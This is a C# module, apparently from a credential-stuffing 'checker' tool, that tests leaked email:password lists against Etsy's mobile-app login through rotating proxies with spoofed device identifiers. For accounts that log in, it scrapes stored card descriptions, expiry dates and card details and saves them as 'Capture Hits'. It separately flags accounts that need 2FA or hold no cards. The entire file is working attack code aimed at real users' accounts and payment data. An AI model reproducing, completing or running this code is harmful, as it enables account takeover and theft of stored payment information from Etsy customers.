using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using UHQKEK.Start;
using Console = Colorful.Console;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace UHQKEK.Modules.Capture
{
    class etsy
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                string id1 = Cryptography.RandomString("?i?i?i?i?i?i?i?i-?i?i?i?i-4?i?i?i-?i?ix?i?i-?i?i?i?i?i?i?i?i?i?i?i?i");
                string D1 = Cryptography.RandomString("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i");
                string D2 = Cryptography.RandomString("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i");
                string D3 = Cryptography.RandomString("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i");
                string US = HttpUtility.UrlEncode(strArray1[0]);
                string PS = HttpUtility.UrlEncode(strArray1[1]);
                string Time = DateTimeOffset.Now.ToUnixTimeMilliseconds().ToString();
                string E1 = HttpUtility.UrlEncode("URL HERE");
                E1 = E1.Replace("access_token%26", "access_token&");
                byte[] key = Encoding.ASCII.GetBytes("wwzr1l5lkn&");
                string E2 = Encode("POST&" + E1, key);
                E2 = HttpUtility.UrlEncode(E2);
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("authorization", "OAuth oauth_signature_method=\"HMAC - SHA1\", oauth_consumer_key=\"KEY HERE\",oauth_version=\"1.0\", oauth_timestamp=\"" + Time + "\", oauth_nonce = \"" + id1 + "\", oauth_signature = \"" + E2 + "\"");
                httpRequest.AddHeader("oauth_version", "2.0");
                httpRequest.AddHeader("x-api-key", D3);
                httpRequest.AddHeader("x-detected-locale", "USD|en|US");
                httpRequest.AddHeader("x-etsy-device", D1);
                string str1 = httpRequest.Post("URL HERE", "x_auth_mode=client_auth&device_type=android&environment_id=1&device_udid=" + D1 + "&device_version=5.84.0&guest_cart_id=" + D2 + "&language=en&app_identifier=com.etsy.android&x_auth_username=" + strArray1[0] + "&x_auth_password=" + strArray1[1] + "&x_auth_two_factor_support_enabled=0", "application/x-www-form-urlencoded").ToString();
                if (str1.Contains("oauth_token"))
                {
                    string T1 = Cryptography.LR(str1, "oauth_token=", "&").FirstOrDefault();
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = false;
                    CookieContainer container = new CookieContainer();
                    httpRequest.AddHeader("origin", "https://www.etsy.com");
                    httpRequest.AddHeader("upgrade-insecure-requests", "1");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Linux; Android 7.1.2; G011A Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 Mobile/1 EtsyInc/5.84.0 Android/1");
                    httpRequest.AddHeader("x-requested-with", "com.etsy.android");
                    string str2 = httpRequest.Post("https://www.etsy.com/externalredirect", "redirect_id=1&token=" + T1 + "&api_key=API KEY HERE &version=5.84.0", "application/x-www-form-urlencoded").ToString();
                    string cook1 = httpRequest.Cookies.GetCookies("https://www.etsy.com/externalredirect")["et-v1-1-1-_etsy_com"].ToString();
                    string cook2 = httpRequest.Cookies.GetCookies("https://www.etsy.com/externalredirect")["st-v1-1-1-_etsy_com"].ToString();
                    string cook3 = httpRequest.Cookies.GetCookies("https://www.etsy.com/externalredirect")["bc-v1-1-1-_etsy_com"].ToString();
                    httpRequest.AddHeader("origin", "https://www.etsy.com");
                    httpRequest.AddHeader("upgrade-insecure-requests", "1");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Linux; Android 7.1.2; G011A Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 Mobile/1 EtsyInc/5.84.0 Android/1");
                    httpRequest.AddHeader("x-requested-with", "com.etsy.android");
                    string str3 = httpRequest.Get("URL HERE").ToString();
                    if (str3.Contains("<h3 class=\"card - description\">"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} | Free", Color.Orange);
                        }
                        Program.Save(combo, "Etsy Free");
                        return true;
                    }
                    else
                    {
                        var list1 = new List<string>();
                        list1 = Cryptography.LR(str3, "<h3 class=\"card-description\">", "</h3>").ToList();
                        string C1 = string.Join(" | ", list1);

                        var list2 = new List<string>();
                        list2 = Cryptography.LR(str3, "\"></span >", "||").ToList();
                        string C2 = string.Join(" | ", list2);

                        var list = new List<string>();
                        list = Cryptography.LR(str3, "li><label>Expiration date</label><span class=\"card-det\">", "</span>", true, false).ToList();
                        string EXP = string.Join(" | ", list);

                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine(combo, Color.Green);
                        }
                        Program.Save(combo + $" | Cards: {C1} | EXP: {EXP} | CardInfo: {C2}", "Etsy Capture Hits");
                        return true;
                    }

                }
                else if (str1.Contains("Password was incorrect") || str1.Contains("Email address is invalid"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str1.Contains("Please reset your password from a computer ") || str1.Contains("Account has been deactivated") || str1.Contains("oauth_problem"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} + | 2FA", Color.Orange);
                    }
                    Program.Save(combo, "Etsy 2FA");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
        public static string Encode(string input, byte[] key)
        {
            HMACSHA1 myhmacsha1 = new HMACSHA1(key);
            byte[] byteArray = Encoding.ASCII.GetBytes(input);
            MemoryStream stream = new MemoryStream(byteArray);
            return myhmacsha1.ComputeHash(stream).Aggregate("", (s, e) => s + String.Format("{0:x2}", e), s => s);
        }
    }
}
